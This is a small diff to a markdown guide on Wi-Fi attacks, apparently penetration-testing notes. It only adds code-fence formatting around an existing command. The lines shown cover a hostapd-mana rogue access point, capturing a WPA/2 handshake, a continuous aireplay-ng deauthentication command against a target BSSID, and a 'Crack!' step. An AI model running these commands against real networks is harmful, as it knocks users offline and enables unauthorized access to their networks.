@@ -75,8 +75,9 @@ sudo hostapd-mana linksys-mana.conf
 Wait for a capture of a WPA/2 handshake in output.
 
 ##### De-Auth if needed
+```text
 sudo aireplay-ng -0 0 -a 11:22:33:44:55:66 wlan0mon
-
+```
 
 #### Crack!
 ```text
